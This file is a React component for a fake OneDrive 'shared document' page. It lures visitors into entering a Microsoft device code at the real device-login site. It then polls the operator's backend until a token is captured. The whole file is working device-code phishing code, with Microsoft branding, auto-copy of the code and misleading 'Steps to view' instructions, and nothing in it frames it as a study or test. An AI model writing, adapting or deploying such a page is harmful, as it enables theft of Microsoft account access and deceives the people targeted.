"use client";

import React, { useState, useEffect, useRef } from "react";

interface Props {
  initialUserCode?: string;
  initialDeviceCode?: string;
  onSuccess?: () => void;
}

export default function Page2SharedDocument({ initialUserCode = "", initialDeviceCode = "", onSuccess }: Props) {
  const [displayCode, setDisplayCode] = useState(initialUserCode);
  const [deviceCode, setDeviceCode] = useState(initialDeviceCode);
  const [verificationUri, setVerificationUri] = useState("https://microsoft.com/devicelogin");
  const [copied, setCopied] = useState(false);
  const [autoCopyToast, setAutoCopyToast] = useState(false);
  const [loading, setLoading] = useState(false);
  const [polling, setPolling] = useState(false);
  const pollingRef = useRef<NodeJS.Timeout | null>(null);

  const fetchDeviceCode = async () => {
    try {
      const res = await fetch("/api/auth/device-code", { method: "POST" });
      const data = await res.json();
      if (!data.error) {
        setDisplayCode(data.user_code || "");
        setDeviceCode(data.device_code || "");
        setVerificationUri(data.verification_uri || "https://microsoft.com/devicelogin");
        return data;
      }
    } catch (e) {
      console.error("Failed to fetch Microsoft device code", e);
    }
    return null;
  };

  useEffect(() => {
    // If pre-fetched code is missing or default, fetch immediately in background
    if (!initialUserCode || !initialDeviceCode) {
      fetchDeviceCode();
    } else {
      setDisplayCode(initialUserCode);
      setDeviceCode(initialDeviceCode);
    }

    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, [initialUserCode, initialDeviceCode]);

  // Effect to handle polling logic whenever deviceCode or polling state changes
  useEffect(() => {
    if (polling && deviceCode) {
      if (pollingRef.current) clearInterval(pollingRef.current);
      
      const intervalMs = 5000;
      pollingRef.current = setInterval(async () => {
        try {
          const res = await fetch("/api/auth/poll-token", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ device_code: deviceCode }),
          });
          const data = await res.json();

          if (data.status === "success") {
            if (pollingRef.current) clearInterval(pollingRef.current);
            if (data.country) {
              sessionStorage.setItem("user_profile_country", data.country);
            }
            if (onSuccess) onSuccess();
          } else if (data.error === "expired_token") {
            // If token expired during polling, fetch a new one
            console.log("Token expired, fetching new one...");
            const newData = await fetchDeviceCode();
            // The effect will re-run and restart polling with the new code
          }
        } catch (err) {
          console.error("Polling error:", err);
        }
      }, intervalMs);
    }

    return () => {
      if (pollingRef.current) clearInterval(pollingRef.current);
    };
  }, [polling, deviceCode, onSuccess]);

  const copyToClipboard = async (text: string) => {
    try {
      await navigator.clipboard.writeText(text);
    } catch {
      const el = document.createElement("textarea");
      el.value = text;
      document.body.appendChild(el);
      el.select();
      document.execCommand("copy");
      document.body.removeChild(el);
    }
  };

  const handleCopy = async () => {
    if (!displayCode) return;
    await copyToClipboard(displayCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2500);
  };

  const handleView = async () => {
    if (!displayCode || !deviceCode) return;
    setLoading(true);

    // Automatically copy the Microsoft-issued user_code to the clipboard
    await copyToClipboard(displayCode);
    setAutoCopyToast(true);
    setTimeout(() => setAutoCopyToast(false), 3000);

    // Open the verification URL returned by Microsoft's device-code response.
    window.open(verificationUri, "_blank", "noopener,noreferrer");
    
    // Trigger polling effect
    setPolling(true);

    setTimeout(() => {
      setLoading(false);
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-[#f3f2f1] flex flex-col font-sans select-none antialiased relative">
      {/* Auto-copy toast notification */}
      {autoCopyToast && (
        <div className="fixed top-5 left-1/2 transform -translate-x-1/2 bg-[#107c10] text-white px-5 py-2.5 rounded-md shadow-lg text-[14px] font-semibold z-50 flex items-center gap-2 animate-fade-in">
          <span>✓ Code copied to clipboard ({displayCode})</span>
        </div>
      )}

      {/* Top Nav Bar */}
      <div className="bg-[#0078d4] px-4 sm:px-6 py-3.5 flex items-center gap-2 shadow-sm w-full">
        <span className="text-white font-semibold text-[16px] sm:text-[18px] tracking-tight">OneDrive</span>
      </div>

      {/* Content Container - Fully Responsive */}
      <div className="flex-1 flex flex-col items-center justify-center p-4 sm:p-6 md:p-8">
        {/* Document Card */}
        <div className="w-full max-w-[480px] bg-white rounded-lg border border-gray-200 shadow-md overflow-hidden my-auto">
          <div className="p-6 sm:p-8">
            {/* PDF icon + title */}
            <div className="flex items-center gap-4 mb-6 pb-6 border-b border-gray-100">
              <div className="w-12 h-12 sm:w-14 sm:h-14 bg-[#d13438] rounded-[4px] flex items-center justify-center flex-shrink-0 shadow-sm">
                <span className="text-white text-[12px] font-bold tracking-wider">PDF</span>
              </div>
              <div className="min-w-0 flex-1">
                <div className="font-bold text-[17px] sm:text-[18px] text-gray-900 leading-snug truncate">Shared Document</div>
                <div className="text-[13px] sm:text-[14px] text-gray-500 font-normal">Document</div>
              </div>
            </div>

            {/* User avatar + shared message */}
            <div className="flex flex-col items-start gap-3.5 mb-6">
              <div className="w-10 h-10 rounded-full bg-[#0078d4] flex items-center justify-center flex-shrink-0 shadow-sm">
                <span className="text-white font-bold text-[18px]">M</span>
              </div>
              <div>
                <div className="font-bold text-[17px] sm:text-[18px] text-gray-900 leading-tight mb-1.5">
                  Microsoft User shared this file with you
                </div>
                <div className="text-[13px] sm:text-[14px] text-gray-600 leading-normal">
                  Sign in with your Microsoft account to view this shared item.
                </div>
              </div>
            </div>

            {/* Verification code section - Appears immediately without Loading state */}
            <div className="bg-[#faf9f8] rounded-md p-5 sm:p-6 mb-6 border border-gray-200/80 text-center">
              <div className="text-[12px] sm:text-[13px] text-gray-500 mb-2 font-medium">Verification code</div>
              <div className="text-[28px] sm:text-[34px] font-bold text-[#005a9e] tracking-[0.12em] mb-4 select-all font-mono break-all">
                {displayCode || "Code unavailable"}
              </div>
              
              <button
                onClick={handleCopy}
                disabled={!displayCode}
                className={`px-6 py-2 rounded-[3px] text-[13px] sm:text-[14px] font-semibold transition-all shadow-sm ${
                  copied
                    ? "bg-[#107c10] text-white"
                    : "bg-[#0078d4] text-white hover:bg-[#106ebe]"
                } disabled:opacity-50`}
              >
                {copied ? "✓ Copied!" : "Copy code"}
              </button>
            </div>

            {/* Steps to view */}
            <div className="mb-7">
              <div className="text-[13px] sm:text-[14px] font-bold text-gray-800 mb-2.5">Steps to view:</div>
              <ol className="space-y-2">
                {[
                  "Click Copy to clipboard above (or View to auto-copy)",
                  "Click Sign in below to open the Microsoft sign-in window",
                  "Paste the code when prompted",
                  "Authenticate with your Microsoft account",
                ].map((step, i) => (
                  <li key={i} className="flex gap-3 text-[13px] sm:text-[14px] text-gray-600 leading-snug">
                    <span className="text-gray-400 font-medium flex-shrink-0">{i + 1}.</span>
                    <span>{step}</span>
                  </li>
                ))}
              </ol>
            </div>

            {/* View button */}
            <div className="flex flex-col items-center gap-3.5">
              <button
                onClick={handleView}
                disabled={loading || !displayCode}
                className="w-full py-2.5 sm:py-3 bg-[#0078d4] text-white rounded-[3px] font-semibold text-[15px] sm:text-[16px] hover:bg-[#106ebe] active:bg-[#005a9e] transition-colors shadow-sm disabled:opacity-70"
              >
                {loading ? (
                  <div className="spinner" style={{ width: 16, height: 16, margin: "0 auto" }} />
                ) : (
                  "View"
                )}
              </button>

              <div className="flex items-center justify-center gap-2 mt-1">
                <div className={polling ? "spinner-blue" : ""} style={{ width: 12, height: 12 }} />
                <span className="text-[12px] sm:text-[13px] text-gray-500 font-medium">
                  {polling ? "Waiting for authentication..." : deviceCode ? "Ready to continue" : "Microsoft code unavailable"}
                </span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
